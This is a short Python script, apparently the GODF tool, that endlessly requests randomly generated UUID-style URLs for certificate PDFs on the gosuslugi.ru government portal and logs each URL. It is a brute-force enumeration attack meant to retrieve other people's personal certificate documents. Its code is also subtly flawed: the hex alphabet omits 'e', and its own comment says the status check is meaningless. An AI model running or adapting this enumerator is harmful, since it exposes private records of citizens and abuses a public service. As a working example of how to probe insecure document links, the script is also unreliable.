import requests
import random
def genurl():
    symb = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","f"]
    first = []
    second= []
    third = []
    four = []
    five = []
    for i in range(8):
        first.append(random.choice(symb))

    for i in range(4):
        second.append(random.choice(symb))
        third.append(random.choice(symb))
        four.append(random.choice(symb))
    for i in range(12):
        five.append(random.choice(symb))
    first= "".join(first)
    third= "".join(third)
    second= "".join(second)
    four= "".join(four)
    five= "".join(five)
    url = f"https://gosuslugi.ru/v1/status-cert/{first}-{second}-{third}-{four}-{five}/pgu/srfile/pdf?lang=ru"
    return url
print("""
       __________  ____  ______
      / ____/ __ \/ __ \/ ____/
     / / __/ / / / / / / /_
    / /_/ / /_/ / /_/ / __/
    \____/\____/_____/_/
    github.com/1Rayko/GODF
""")
headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
   'From': 'alexHate1@protonmail.com'
}
while 1:
    url = genurl()
    s  = requests.Session()
    r = s.get(url,headers = headers)
    if r.status_code == 200:# бляха-муха какой код (200 в любом случае возвращается)
        with open("log.txt","a") as file_handler:
            print(url)
            file_handler.write(url+"\n")
    else:
        with open("log.txt","a") as file_handler:
            print(url + " ИЗ ELSE ")
            file_handler.write("ELSE "+ url+"\n")


